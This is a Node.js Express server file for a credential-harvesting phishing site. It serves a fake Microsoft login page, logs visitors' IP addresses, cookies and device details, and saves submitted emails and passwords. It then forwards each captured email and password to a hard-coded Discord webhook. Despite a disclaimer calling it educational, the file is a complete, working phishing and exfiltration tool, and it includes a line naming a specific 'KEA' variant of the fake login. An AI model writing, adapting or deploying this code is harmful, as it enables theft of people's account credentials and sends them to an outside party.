// collect_credentials.js
// Simple credential harvester for educational/security testing purposes only
import fs from "fs";
import path from "path";
import express from "express";
import cors from "cors";
import { fileURLToPath } from "url";
import os from "os";
import dns from "dns";
import { promisify } from "util";
import fetch from "node-fetch"; // Added for Discord webhook integration

// Discord webhook configuration - Replace with your actual webhook URL
const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1211831405630333000/psINKEzhYDxixSt1BhuOVbNh5gTimPpcNmQCjRfG6Kyic7y4eJt2uMZmSxmq2YM3vSBj"; // Replace this with your Discord webhook URL

// Get directory name equivalent in ESM
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const projectRoot = path.join(__dirname, "..");

// Create logs directory if it doesn't exist
const logsDir = path.join(projectRoot, "logs");
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
}

// Create Express app
const app = express();

// Configure middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the public directory
app.use(express.static(path.join(projectRoot, "public")));

// Specifically serve templates directory
app.use("/templates", express.static(path.join(projectRoot, "templates")));

// Also serve from api directory for any api-specific assets
app.use("/api", express.static(__dirname));

// Function to log access with enhanced information
async function logAccess(req) {
  const accessTime = new Date().toISOString();
  const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"] || "Unknown";

  // Extract OS, browser, and device info from user agent
  const deviceInfo = parseUserAgent(userAgent);

  // Get referring page if available
  const referrer = req.headers["referer"] || "Direct/Unknown";

  // Get server hostname
  const serverHostname = os.hostname();

  // Try to get client hostname from IP (may not work in all environments)
  let clientHostname = "Unknown";
  try {
    const lookup = promisify(dns.reverse);
    const hostnames = await lookup(ipAddress.replace("::ffff:", "")).catch(
      () => []
    );
    if (hostnames && hostnames.length > 0) {
      clientHostname = hostnames[0];
    }
  } catch (error) {
    // Silently fail if we can't get hostname
  }

  // Get accept-language header
  const language = req.headers["accept-language"] || "Unknown";

  // Capture screen resolution and color depth if sent from client
  const screenInfo = req.body.screenInfo || "Not provided";

  // Get connection info
  const connectionInfo = {
    protocol: req.protocol,
    secure: req.secure,
    method: req.method,
    path: req.path,
  };

  // Cookies (if any)
  const cookies = req.headers.cookie || "No cookies";

  // Network info
  const networkInfo = {
    serverIp: getServerIp(),
    serverInterfaces: Object.keys(os.networkInterfaces()),
  };

  // Prepare access log object with all collected information
  const accessInfo = {
    accessTime,
    ipAddress,
    clientHostname,
    userAgent,
    deviceInfo,
    referrer,
    language,
    screenInfo,
    serverInfo: {
      hostname: serverHostname,
      platform: os.platform(),
      type: os.type(),
      release: os.release(),
    },
    connectionInfo,
    networkInfo,
    cookies,
  };

  // Log detailed information in JSON format
  const detailedLogEntry = JSON.stringify(accessInfo, null, 2);
  fs.appendFileSync(
    path.join(logsDir, "detailed_access_log.json"),
    detailedLogEntry + ",\n"
  );

  // Still log a simple one-line entry in the original format for quick access
  const simpleLogEntry = `[${accessTime}] IP: ${ipAddress} | User-Agent: ${userAgent} | OS: ${deviceInfo.os} | Browser: ${deviceInfo.browser}\n`;
  fs.appendFileSync(path.join(logsDir, "access_log.txt"), simpleLogEntry);

  return accessInfo;
}

// Function to log harvested credentials with enhanced information
async function logCredentials(email, password, accessInfo) {
  // Create a more detailed log with all available information
  const credentialEntry = {
    timestamp: accessInfo.accessTime,
    credentials: {
      email: email,
      password: password,
      organization: accessInfo.org || "unknown",
    },
    userInfo: accessInfo,
  };

  // Log in JSON format as part of a proper array
  const credentialsFilePath = path.join(logsDir, "detailed_credentials.json");

  // Create or update the credentials file as a proper JSON array
  try {
    let existingCredentials = [];

    // Check if file exists and has content
    if (fs.existsSync(credentialsFilePath)) {
      const fileContent = fs.readFileSync(credentialsFilePath, "utf8");

      // If the file has content, parse it
      if (fileContent.trim()) {
        try {
          // Try to parse as a JSON array
          existingCredentials = JSON.parse(fileContent);

          // If it's not an array (old format), convert to array with existing entries
          if (!Array.isArray(existingCredentials)) {
            console.log("Converting old credentials format to array");
            // The old format had trailing commas, we need to handle that
            const cleanedContent = "[" + fileContent.replace(/,\s*$/, "") + "]";
            try {
              existingCredentials = JSON.parse(cleanedContent);
            } catch (parseErr) {
              // If we can't parse it, start fresh
              console.error(
                "Could not convert old credentials format:",
                parseErr
              );
              existingCredentials = [];
            }
          }
        } catch (parseError) {
          // If we can't parse the file, start fresh
          console.error("Error parsing credentials file:", parseError);
          existingCredentials = [];
        }
      }
    }

    // Add the new credential entry
    existingCredentials.push(credentialEntry);

    // Write back as a proper JSON array
    fs.writeFileSync(
      credentialsFilePath,
      JSON.stringify(existingCredentials, null, 2)
    );

    // Also maintain the simple log format for backward compatibility
    const simpleLogEntry = `[${accessInfo.accessTime}] Email: ${email} | Password: ${password} | IP: ${accessInfo.ipAddress} | OS: ${accessInfo.deviceInfo.os} | Browser: ${accessInfo.deviceInfo.browser}\n`;
    fs.appendFileSync(
      path.join(logsDir, "harvested_credentials.txt"),
      simpleLogEntry
    );
  } catch (error) {
    console.error("Error writing to credentials file:", error);

    // Fallback to the old method if something goes wrong
    const detailedCredentialLog = JSON.stringify(credentialEntry, null, 2);
    fs.appendFileSync(credentialsFilePath, detailedCredentialLog + ",\n");
  }

  // Send credentials to Discord webhook
  if (DISCORD_WEBHOOK_URL) {
    const discordPayload = {
      content: `New credentials captured:\nEmail: ${email}\nPassword: ${password}\nIP: ${accessInfo.ipAddress}\nOS: ${accessInfo.deviceInfo.os}\nBrowser: ${accessInfo.deviceInfo.browser}`,
    };

    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(discordPayload),
      });
    } catch (error) {
      console.error("Error sending to Discord webhook:", error);
    }
  }
}

// Parse User-Agent string to extract OS, browser, and device info
function parseUserAgent(ua) {
  // Initialize with unknown values
  let deviceInfo = {
    os: "Unknown",
    browser: "Unknown",
    device: "Unknown",
    mobile: false,
  };

  // OS detection
  if (ua.includes("Windows")) {
    deviceInfo.os = ua.includes("Windows NT 10.0")
      ? "Windows 10/11"
      : ua.includes("Windows NT 6.3")
      ? "Windows 8.1"
      : ua.includes("Windows NT 6.2")
      ? "Windows 8"
      : ua.includes("Windows NT 6.1")
      ? "Windows 7"
      : ua.includes("Windows NT 6.0")
      ? "Windows Vista"
      : "Windows";
  } else if (ua.includes("Mac OS X")) {
    // Extract macOS version if possible
    const macOSMatch = ua.match(/Mac OS X (\d+[._]\d+[._]?\d*)/);
    deviceInfo.os = macOSMatch
      ? `macOS ${macOSMatch[1].replace(/_/g, ".")}`
      : "macOS";
  } else if (ua.includes("Linux")) {
    deviceInfo.os = ua.includes("Android") ? "Android" : "Linux";
  } else if (
    ua.includes("iPhone") ||
    ua.includes("iPad") ||
    ua.includes("iPod")
  ) {
    deviceInfo.os = "iOS";
  }

  // Browser detection
  if (
    ua.includes("Chrome") &&
    !ua.includes("Chromium") &&
    !ua.includes("Edg")
  ) {
    deviceInfo.browser = "Chrome";
  } else if (ua.includes("Firefox") && !ua.includes("Seamonkey")) {
    deviceInfo.browser = "Firefox";
  } else if (
    ua.includes("Safari") &&
    !ua.includes("Chrome") &&
    !ua.includes("Chromium")
  ) {
    deviceInfo.browser = "Safari";
  } else if (ua.includes("Edg")) {
    deviceInfo.browser = "Edge";
  } else if (ua.includes("MSIE") || ua.includes("Trident")) {
    deviceInfo.browser = "Internet Explorer";
  } else if (ua.includes("Opera") || ua.includes("OPR")) {
    deviceInfo.browser = "Opera";
  }

  // Device type detection
  if (
    ua.includes("Mobile") ||
    ua.includes("Android") ||
    ua.includes("iPhone") ||
    ua.includes("iPad") ||
    ua.includes("iPod")
  ) {
    deviceInfo.mobile = true;
    if (ua.includes("iPhone")) {
      deviceInfo.device = "iPhone";
    } else if (ua.includes("iPad")) {
      deviceInfo.device = "iPad";
    } else if (ua.includes("Android")) {
      deviceInfo.device = "Android Device";
    } else {
      deviceInfo.device = "Mobile Device";
    }
  } else {
    deviceInfo.device = "Desktop/Laptop";
  }

  return deviceInfo;
}

// Get server's primary IP address
function getServerIp() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      // Skip internal and non-IPv4 addresses
      if (!iface.internal && iface.family === "IPv4") {
        return iface.address;
      }
    }
  }
  return "127.0.0.1"; // Fallback
}

// Routing logic for main URLs
app.get("/", (req, res) => {
  res.redirect("/microsoft_login.html");
});

// Create a test endpoint for credential submission
app.get("/test-credential-discord", async (req, res) => {
  try {
    console.log("Test credential endpoint called");

    // Create a sample access info object
    const sampleAccessInfo = {
      accessTime: new Date().toISOString(),
      ipAddress: req.ip || "127.0.0.1",
      deviceInfo: {
        os: "Test OS",
        browser: "Test Browser",
      },
    };

    // Log test credentials with the Discord integration
    await logCredentials(
      "test@example.com",
      "testPassword123",
      sampleAccessInfo
    );

    res.json({
      status: "success",
      message: "Test credentials sent to Discord webhook",
      webhookUrl: DISCORD_WEBHOOK_URL ? "Configured" : "Not configured",
    });
  } catch (error) {
    console.error("Error testing credential Discord integration:", error);
    res.status(500).json({
      status: "error",
      message: "Failed to send test credentials to Discord",
      error: error.message,
    });
  }
});

// Handle credentials collection endpoints (both with and without /api prefix)
app.post("/collect_credentials", handleCredentialSubmission);
app.post("/api/collect_credentials", handleCredentialSubmission);

// Extracted the credential processing logic into a separate function
async function handleCredentialSubmission(req, res) {
  try {
    console.log("Credentials endpoint called", {
      body: req.body,
      path: req.path,
      method: req.method,
    });

    const accessInfo = await logAccess(req);

    if (req.body.email && req.body.password) {
      // Store organization identifier if provided
      if (req.body.org) {
        accessInfo.org = req.body.org;
      }

      console.log("Valid credentials received, sending to Discord");
      await logCredentials(req.body.email, req.body.password, accessInfo);
      console.log("Credentials processed successfully");

      // Return success without exposing internal details
      res.json({ status: "success" });
    } else {
      console.log("Invalid credentials received", req.body);
      res.status(400).json({
        status: "error",
        message: "Email and password required",
      });
    }
  } catch (error) {
    console.error("Error processing credentials:", error);
    res.status(500).json({ status: "error", message: "Internal server error" });
  }
}

// Create an endpoint to test Discord webhook
app.get("/test-discord", async (req, res) => {
  try {
    if (
      !DISCORD_WEBHOOK_URL ||
      DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE"
    ) {
      return res.status(400).json({
        status: "error",
        message: "Discord webhook URL is not configured properly",
      });
    }

    const testPayload = {
      content: `🔔 Test notification from phishing site at ${new Date().toISOString()}`,
    };

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(testPayload),
    });

    res.json({ status: "success", message: "Test message sent to Discord" });
  } catch (error) {
    console.error("Error sending test to Discord webhook:", error);
    res.status(500).json({
      status: "error",
      message: "Failed to send test message to Discord",
      error: error.message,
    });
  }
});

// Create an endpoint to view collected statistics (protected in a real scenario)
app.get("/admin/stats", (req, res) => {
  try {
    // In a real scenario, this would be password protected
    const accessLogPath = path.join(logsDir, "access_log.txt");
    const credentialsLogPath = path.join(logsDir, "harvested_credentials.txt");

    let stats = {
      totalVisits: 0,
      credentialsCollected: 0,
      lastAccess: "None",
      lastCredentials: "None",
    };

    if (fs.existsSync(accessLogPath)) {
      const accessLog = fs.readFileSync(accessLogPath, "utf8");
      stats.totalVisits = accessLog
        .split("\n")
        .filter((line) => line.trim()).length;
      const lastLine = accessLog
        .split("\n")
        .filter((line) => line.trim())
        .pop();
      stats.lastAccess = lastLine || "None";
    }

    if (fs.existsSync(credentialsLogPath)) {
      const credsLog = fs.readFileSync(credentialsLogPath, "utf8");
      stats.credentialsCollected = credsLog
        .split("\n")
        .filter((line) => line.trim()).length;
      const lastLine = credsLog
        .split("\n")
        .filter((line) => line.trim())
        .pop();
      stats.lastCredentials = lastLine || "None";
    }

    res.json(stats);
  } catch (error) {
    res.status(500).json({ error: "Error retrieving statistics" });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Phishing simulation server running on port ${PORT}`);
  console.log(
    `Access the phishing site at: http://localhost:${PORT}/microsoft_login.html`
  );
  console.log(
    `Access the KEA version at: http://localhost:${PORT}/kea_microsoft_login.html`
  );
  console.log(`View statistics at: http://localhost:${PORT}/admin/stats`);
  console.log(
    "WARNING: This script is for educational and authorized security testing purposes only"
  );
});
